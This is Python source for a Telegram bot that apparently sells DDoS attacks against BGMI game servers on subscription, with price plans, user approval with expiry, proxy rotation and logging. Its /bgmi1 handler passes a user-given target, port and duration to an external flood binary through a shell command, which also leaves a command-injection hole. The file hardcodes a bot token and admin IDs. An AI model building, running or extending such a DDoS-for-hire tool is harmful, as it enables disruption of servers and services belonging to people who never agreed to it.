import telebot
import time
from datetime import datetime
import subprocess
import os
import pymongo
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# insert your Telegram bot token here
bot = telebot.TeleBot('7590495904:AAFdglWV5N7utNySffevsgAeUuaMcintVS0')

# Admin user IDs
admin_id = ["1786683163","5894848388"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store admin IDs
ADMIN_FILE = "admins.txt"

# File to store command logs
LOG_FILE = "log.txt"

ongoing_attacks = {}
MAX_CONCURRENT_ATTACKS = 2  # Set the max concurrent users who can launch attacks

#this id proxy by attackddosowner
def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

#Function to read admin IDs from the file
def read_admins():
    try:
        with open(ADMIN_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["1786683163"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ‚ùå."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ‚úÖ"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} üëç."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists ü§¶‚Äç‚ôÇÔ∏è."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add üòò."
    else:
        response = "‚ú∞ ùêÅùêíùêÉùêä ùêòùêÑ ùêéùêñùêçùêÑùêë ùêäùêÑ ùêäùêÄùêå ùêäùêà ùêáùêÄùêà ‚úØ"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['Myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"üë§ ùêòùê®ùêÆùê´ ùê¢ùêßùêüùê®:\n\nüÜî ùêîùê¨ùêûùê´ ùêàùêù: <code>{user_id}</code>\nüìù ùêîùê¨ùêûùê´ùêßùêöùê¶ùêû: {username}\nüîñ ùêëùê®ùê•ùêû: {user_role}\nüìÖ ùêÄùê©ùê©ùê´ùê®ùêØùêöùê• ùêÑùê±ùê©ùê¢ùê´ùê≤ ùêÉùêöùê≠ùêû: {user_approval_expiry.get(user_id, 'Not Approved')}\n‚è≥ ùêëùêûùê¶ùêöùê¢ùêßùê¢ùêßùê† ùêÄùê©ùê©ùê´ùê®ùêØùêöùê• ùêìùê¢ùê¶ùêû: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully üëç."
            else:
                response = f"User {user_to_remove} not found in the list ‚ùå."
        else:
            response = '''Please Specify A User ID to Remove. 
‚úÖ Usage: /remove <userid>'''
    else:
        response = "‚ú∞ ùêÅùêíùêÉùêä ùêòùêÑ ùêéùêñùêçùêÑùêë ùêäùêÑ ùêäùêÄùêå ùêäùêà ùêáùêÄùêà ‚úØ"

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ‚ùå."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ‚úÖ"
        except FileNotFoundError:
            response = "Logs are already cleared ‚ùå."
    else:
        response = "You have not purchased yet purchase now from :- @TMZEROO ‚ùÑ."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ‚ùå."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ‚úÖ"
        except FileNotFoundError:
            response = "users are already cleared ‚ùå."
    else:
        response = "Íú∞ Ä·¥á·¥á ·¥ã·¥á ·¥Ö ú·¥Ä Ä·¥ç Íú± ú·¥Ä ü·¥Ä  ú·¥Ä…™ ·¥ã è·¥Ä ·¥ä·¥è ·¥ç·¥ú ·¥ú·¥õ·¥õ ú·¥Ä ·¥ã·¥Ä…™ ·¥ã ú…™  ô ú…™ …¢·¥úÍú±  Ä ú·¥Ä…™  ú·¥è  ô·¥ú è ·¥ã Ä·¥è Íú∞ Ä·¥á·¥á ·¥ç·¥Ä…™ ·¥ã·¥ú·¥Ñ ú …¥ ú…™ ·¥ç…™ ü·¥õ·¥Ä  ô·¥ú è:- @TMZEROO üôá."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ‚ùå"
        except FileNotFoundError:
            response = "No data found ‚ùå"
    else:
        response = "Íú∞ Ä·¥á·¥á ·¥ã·¥á ·¥Ö ú·¥Ä Ä·¥ç Íú± ú·¥Ä ü·¥Ä  ú·¥Ä…™ ·¥ã è·¥Ä ·¥ä·¥è ·¥ç·¥ú ·¥ú·¥õ·¥õ ú·¥Ä ·¥ã·¥Ä…™ ·¥ã ú…™  ô ú…™ …¢·¥úÍú±  Ä ú·¥Ä…™  ú·¥è  ô·¥ú è ·¥ã Ä·¥è Íú∞ Ä·¥á·¥á ·¥ç·¥Ä…™ ·¥ã·¥ú·¥Ñ ú …¥ ú…™ ·¥ç…™ ü·¥õ·¥Ä  ô·¥ú è:- @TMZEROO ‚ùÑ."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ‚ùå."
                bot.reply_to(message, response)
        else:
            response = "No data found ‚ùå"
            bot.reply_to(message, response)
    else:
        response = "Íú∞ Ä·¥á·¥á ·¥ã·¥á ·¥Ö ú·¥Ä Ä·¥ç Íú± ú·¥Ä ü·¥Ä  ú·¥Ä…™ ·¥ã è·¥Ä ·¥ä·¥è ·¥ç·¥ú ·¥ú·¥õ·¥õ ú·¥Ä ·¥ã·¥Ä…™ ·¥ã ú…™  ô ú…™ …¢·¥úÍú±  Ä ú·¥Ä…™  ú·¥è  ô·¥ú è ·¥ã Ä·¥è Íú∞ Ä·¥á·¥á ·¥ç·¥Ä…™ ·¥ã·¥ú·¥Ñ ú …¥ ú…™ ·¥ç…™ ü·¥õ·¥Ä  ô·¥ú è:- @TMZEROO ‚ùÑ."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi1 command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = (
        f"üéá  ùêÄùê≠ùê≠ùêöùêúùê§ ùê¨ùêûùêßùê≠ ùê¨ùêÆùêúùêúùêûùê¨ùêüùêÆùê•ùê•ùêûùê≤ !üéá\n\n"
        f"üéØ ùêìùêöùê´ùê†ùêûùê≠: `{target}`\n"
        f"üîå ùêèùê®ùê´ùê≠: `{port}`\n"
        f"‚è≥ ùêÉùêÆùê´ùêöùê≠ùê¢ùê®ùêß: `{time} seconds`\n"
        f"üéÆ ùêÜùêöùê¶ùêû: `ùêÅùêÜùêåùêà`\n\n"
        f"üìù ùêÄùêùùêØùê¢ùêúùêû :- ùêòùê®ùêÆùê´ ùêÄùê≠ùê≠ùêöùêúùê§ ùêñùê¢ùê•ùê• ùêÅùêû ùêÖùê¢ùêßùê¢ùê¨ùê°ùêûùêù ùêàùêß {time} \n ùêñùêöùê¢ùê≠ ùêáùêûùê´ùêû ùêñùê¢ùê≠ùê°ùê®ùêÆùê≠ ùêìùê®ùêÆùêúùê°ùê¢ùêßùê† ùêÄùêßùê≤ ùêÅùêÆùê≠ùê≠ùê®ùêß ...üöÄ\n"
    )
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(
        telebot.types.InlineKeyboardButton("üç∑·¥ä·¥è…™…¥ ·¥Ñ ú·¥Ä…¥…¥·¥á üüç∑", url="https://t.me/NoxxNetwork")
    )
    
    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)
    

# Dictionary to store the last time each user ran the /bgmi1 command
bgmi1_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi1 command
@bot.message_handler(commands=['bgmi1'])
def handle_bgmi1(message):
    user_id = str(message.chat.id)

    if user_id in allowed_user_ids:
        # Check the number of ongoing attacks
        if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
            response = "Too many concurrent attacks are running. Please wait until some finish."
            bot.reply_to(message, response)
            return

        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi1_cooldown and (datetime.datetime.now() - bgmi1_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown ‚ùå. Please Wait Before Running The /bgmi1 Command Again."
                bot.reply_to(message, response)
                return

            # Update the last time the user ran the command
            bgmi1_cooldown[user_id] = datetime.datetime.now()

        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 180:
                response = "Error: Time interval must be less than 180."
            else:
                # Add this attack to the ongoing attacks
                ongoing_attacks[user_id] = datetime.datetime.now()

                record_command_logs(user_id, '/bgmi1', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./Rahul {target} {port} {time} 900"
                process = subprocess.run(full_command, shell=True)

                # Remove from ongoing attacks once the attack completes
                ongoing_attacks.pop(user_id, None)

                response = f"üéâ ùêÇùêéùêåùêèùêãùêÑùêìùêÑ ùêÄùêìùêìùêÄùêÇùêäüîª \n\nüí¢ùêìùêöùê´ùê†ùêûùê≠ -> {target} \nüí¢ùêèùê®ùê´ùê≠: {port} \nüí¢ùêìùê¢ùê¶ùêû: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "ùêèùê•ùêûùêöùê¨ùêû ùê©ùê´ùê®ùêØùê¢ùêùùêûüöÄ: /bgmi1  <ùêáùê®ùê¨ùê≠> <ùêèùê®ùê´ùê≠> <ùêìùê¢ùê¶ùêû>"  # Updated command syntax 
    else:
        response = '''üö´ ùêîùêßùêöùêÆùê≠ùê°ùê®ùê´ùê¢ùê¨ùê°ùêûùêù ùêÄùêúùêúùêûùê¨ùê¨! üö´

ùêéùê®ùê©ùê¨! ùêàùê≠ ùê¨ùêûùêûùê¶ùê¨ ùê•ùê¢ùê§ùêû ùê≤ùê®ùêÆ ùêùùê®ùêß'ùê≠ ùê°ùêöùêØùêû ùê©ùêûùê´ùê¶ùê¢ùê¨ùê¨ùê¢ùê®ùêß ùê≠ùê® ùêÆùê¨ùêû ùê≠ùê°ùêû /ùêöùê≠ùê≠ùêöùêúùê§ ùêúùê®ùê¶ùê¶ùêöùêßùêù. ùêìùê® ùê†ùêöùê¢ùêß ùêöùêúùêúùêûùê¨ùê¨ ùêöùêßùêù ùêÆùêßùê•ùêûùêöùê¨ùê° ùê≠ùê°ùêû ùê©ùê®ùê∞ùêûùê´ ùê®ùêü ùêöùê≠ùê≠ùêöùêúùê§ùê¨, ùê≤ùê®ùêÆ ùêúùêöùêß:

üëâ ùêÇùê®ùêßùê≠ùêöùêúùê≠ ùêöùêß ùêÄùêùùê¶ùê¢ùêß ùê®ùê´ ùê≠ùê°ùêû ùêéùê∞ùêßùêûùê´-@TMZEROO ùêüùê®ùê´ ùêöùê©ùê©ùê´ùê®ùêØùêöùê•.
üåü ùêÅùêûùêúùê®ùê¶ùêû ùêö ùê©ùê´ùê®ùêÆùêù ùê¨ùêÆùê©ùê©ùê®ùê´ùê≠ùêûùê´ ùêöùêßùêù ùê©ùêÆùê´ùêúùê°ùêöùê¨ùêû ùêöùê©ùê©ùê´ùê®ùêØùêöùê•.
üí¨ ùêÇùê°ùêöùê≠ ùê∞ùê¢ùê≠ùê° ùêöùêß ùêöùêùùê¶ùê¢ùêß ùêßùê®ùê∞ ùêöùêßùêù ùê•ùêûùêØùêûùê• ùêÆùê© ùê≤ùê®ùêÆùê´ ùêúùêöùê©ùêöùêõùê¢ùê•ùê¢ùê≠ùê¢ùêûùê¨!'''

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi1 and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "‚ùå No Command Logs Found For You ‚ùå."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command üò°."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''üåç ùêñùêÑùêãùêÇùêéùêåùêÑ ùêìùêé ùêØ2ùêÉùêÉùêéùêí ùêñùêéùêëùêãùêÉ!* üéâ

ü§ñ ùêÄùêØùêöùê¢ùê•ùêöùêõùê•ùêû ùêúùê®ùê¶ùê¶ùêöùêßùêùùê¨:
üí• /bgmi1 : ùêåùêûùê≠ùê°ùê®ùêù ùêÖùê®ùê´ ùêÅùê†ùê¶ùê¢ ùêíùêûùê´ùêØùêûùê´ùê¨. 
üí• /ùê´ùêÆùê•ùêûùê¨ : ùêèùê•ùêûùêöùê¨ùêû ùêÇùê°ùêûùêúùê§ ùêÅùêûùêüùê®ùê´ùêû ùêîùê¨ùêû !!.
üí• /ùê¶ùê≤ùê•ùê®ùê†ùê¨ : ùêìùê® ùêÇùê°ùêûùêúùê§ ùêòùê®ùêÆùê´ ùêëùêûùêúùêûùêßùê≠ùê¨ ùêÄùê≠ùê≠ùêöùêúùê§ùê¨.
üí• /ùêúùê°ùêöùêßùêßùêûùê• : ùêúùê°ùêûùêúùê§ ùêÅùê¢ùê≠ ùêçùêûùê≠ ùêÇùê°ùêöùêßùêßùêûùê•
üí• /ùê´ùêûùê¨ùêûùê•ùê•ùêûùê´ùê¨ùê°ùê¢ùê© : ùêÇùê®ùêßùê≠ùêöùêúùê≠ ùêéùê∞ùêßùêûùê´ ùêìùê® ùêìùê°ùêû ùêÄùê©ùê©ùê´ùê®ùêØùêöùê•
ü§ñ ùêìùê® ùêíùêûùêû ùêÅùê®ùê≠ ùêÄùêùùê¶ùê¢ùêß ùêÇùê®ùê¶ùê¶ùêöùêßùêùùê¨:
üí• /ùêöùêùùê¶ùê¢ùêßùêúùê¶ùêù : ùêíùê°ùê®ùê∞ùê¨ ùêÄùê•ùê• ùêÄùêùùê¶ùê¢ùêß ùêÇùê®ùê¶ùê¶ùêöùêßùêùùê¨.
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("/bgmi1 üî•")
    btn2 = KeyboardButton("/Myinfo ‚ÑπÔ∏è")
    btn3 = KeyboardButton("/Rules üßæ")
    btn4 = KeyboardButton("/Plan ü§ë")
    btn5 = KeyboardButton("/Canary ü¶Ö")
    btn6 = KeyboardButton("/Channel üíØ")

    # Add buttons to the markup
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)

    bot.send_message(message.chat.id, "*ùêñùêûùê•ùêúùê®ùê¶ùêû ùê≠ùê® ùê≠ùê°ùêû ùêöùê≠ùê≠ùêöùêúùê§ ùêõùê®ùê≠: \n ùêÇùê°ùê®ùê®ùê¨ùêû ùêöùêß ùê®ùê©ùê≠ùê¢ùê®ùêß :*", reply_markup=markup, parse_mode='Markdown')


@bot.message_handler(commands=['Channel'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f''' ùêâùê®ùê¢ùêß ùêÇùê°ùêöùêßùêßùêûùê• ùêÖùê®ùê´ ùêçùêûùê∞ ùêÖùê´ùêûùêû ùêÉùêùùê®ùê¨  ùêîùê©ùêùùêöùê≠ùêûùê¨ & ùêèùêöùê¢ùêù ùêùùêùùê®ùê¨:
ùêéùêñùêçùêÑùêë: @TMZEROO
'''

    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('üíüSUPPORT‚ù§Ô∏è‚Äçüî•', url='https://t.me/nandyadu1c'),
        telebot.types.InlineKeyboardButton('üò∫FEEDBACK‚ù§Ô∏è‚Äçü©π', url='https://t.me/v2ddosfeedback')  
    )

    bot.reply_to(message, response, reply_markup=keyboard)


@bot.message_handler(commands=['Canary'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''üí• ùêèùê•ùêûùêöùê¨ùêû ùêìùêöùê© ùê≠ùê°ùêû ùêÅùêÆùê≠ùê≠ùê®ùêß ùêüùê®ùê´ ùêÇùêöùêßùêöùê´ùê≤ ùêÉùê®ùê∞ùêßùê•ùê®ùêöùêù:
'''
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(
        telebot.types.InlineKeyboardButton("CANARY ü¶Ö", url="https://t.me/creativeydv/2")
    )
    
    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)

    
@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''ü§© ùêñùêûùê•ùêúùê®ùê¶ùêû ùê≠ùê® @TMZEROO ùêÉùêÉùêéùêí ùêÅùêéùêì , 
üåú /ùêöùêùùêù : ùêöùêùùêù {ùêÆùê¨ùêûùê´_ùê¢ùêù}  {ùê≠ùê¢ùê¶ùêû} 
‚ù£Ô∏è /ùê´ùêûùê¶ùê®ùêØùêû: ùê´ùêûùê¶ùê®ùêØùêû {ùêÆùê¨ùêûùê´_ùê¢ùêù}
üå† /ùêöùê•ùê•ùêÆùê¨ùêûùê´ùê¨ : ùêúùê°ùêûùêúùê§ ùêöùê•ùê• ùêÆùê¨ùêûùê´ùê¨
ü§© /ùêúùê•ùêûùêöùê´ùê•ùê®ùê†ùê¨ : ùêúùê°ùêûùêúùê§ ùêöùê•ùê• ùê•ùê®ùê†ùê¨
'''
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['Rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} ùêèùê•ùêûùêöùê¨ùêû ùêÖùê®ùê•ùê•ùê®ùê∞ ùêìùê°ùêûùê¨ùêû ùêëùêÆùê•ùêûùê¨ ‚ö†Ô∏è:

ùüè. ùêÉùê®ùêßùê≠ ùêëùêÆùêß ùêìùê®ùê® ùêåùêöùêßùê≤ ùêÄùê≠ùê≠ùêöùêúùê§ùê¨ !! ùêÇùêöùêÆùê¨ùêû ùêÄ ùêÅùêöùêß ùêÖùê´ùê®ùê¶ ùêÅùê®ùê≠
ùüê. ùêÉùê®ùêßùê≠ ùêëùêÆùêß ùüê ùêÄùê≠ùê≠ùêöùêúùê§ùê¨ ùêÄùê≠ ùêíùêöùê¶ùêû ùêìùê¢ùê¶ùêû ùêÅùêûùêúùê≥ ùêàùêü ùêî ùêìùê°ùêûùêß ùêî ùêÜùê®ùê≠ ùêÅùêöùêßùêßùêûùêù ùêÖùê´ùê®ùê¶ ùêÅùê®ùê≠.
ùüë. ùêåùêÄùêäùêÑ ùêíùêîùêëùêÑ ùêòùêéùêî ùêâùêéùêà??ùêÑùêÉ @CREATIVEYDV ùêéùêìùêáùêÑùêëùêñùêàùêíùêÑ ùêçùêéùêì ùêñùêéùêëùêä
ùüí. ùêñùêû ùêÉùêöùê¢ùê•ùê≤ ùêÇùê°ùêûùêúùê§ùê¨ ùêìùê°ùêû ùêãùê®ùê†ùê¨ ùêíùê® ùêÖùê®ùê•ùê•ùê®ùê∞ ùê≠ùê°ùêûùê¨ùêû ùê´ùêÆùê•ùêûùê¨ ùê≠ùê® ùêöùêØùê®ùê¢ùêù ùêÅùêöùêß!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['Plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, ùêÅùê´ùê®ùê≠ùê°ùêûùê´ ùêéùêßùê•ùê≤ ùüè ùêèùê•ùêöùêß ùêàùê¨ ùêèùê®ùê∞ùêûùê´ùêüùêÆùê•ùê• ùêìùê°ùêûùêß ùêÄùêßùê≤ ùêéùê≠ùê°ùêûùê´ ùêÉùêùùê®ùê¨ !!:

ùêïùê¢ùê© üåü :
-> ùêÄùê≠ùê≠ùêöùêúùê§ ùêìùê¢ùê¶ùêû : ùüëùüéùüé (ùêí)
> ùêÄùêüùê≠ùêûùê´ ùêÄùê≠ùê≠ùêöùêúùê§ ùêãùê¢ùê¶ùê¢ùê≠ : ùüèùüé ùê¨ùêûùêú
-> ùêÇùê®ùêßùêúùêÆùê´ùê´ùêûùêß??ùê¨ ùêÄùê≠ùê≠ùêöùêúùê§ : ùüì

ùêèùê´-ùê¢ùêúùêû ùêãùê¢ùê¨ùê≠üí∏ :
ùêÉùêöùê≤-->ùüñùüé ùêëùê¨
ùêñùêûùêûùê§-->ùüíùüéùüé ùêëùê¨
ùêåùê®ùêßùê≠ùê°-->ùüèùüéùüéùüé ùêëùê¨
DM @TMZEROO‚úÖ
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "‚ö†Ô∏è Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users üëç."
        else:
            response = "ü§ñ Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command üò°."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


